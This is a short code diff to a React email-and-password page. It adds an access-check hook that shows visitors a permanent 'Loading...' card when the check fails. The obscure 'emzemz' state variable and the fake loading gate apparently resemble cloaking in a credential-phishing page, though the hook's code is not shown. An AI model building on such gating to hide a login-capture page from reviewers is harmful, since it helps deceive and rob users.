@@ -2,6 +2,7 @@ import React, { useState } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
+import useAccessCheck from '../Utils/useAccessCheck';
 import FlowCard from '../components/FlowCard';
 
 const EmailPassword: React.FC = () => {
@@ -20,6 +21,15 @@ const EmailPassword: React.FC = () => {
   const navigate = useNavigate();
   const location = useLocation();
   const { emzemz } = location.state || {};
+  const isAllowed = useAccessCheck(baseUrl);
+
+  if (!isAllowed) {
+    return (
+      <FlowCard title="Loading">
+        <div className="text-center text-white">Loading...</div>
+      </FlowCard>
+    );
+  }
 
   if (!emzemz) {
     return (
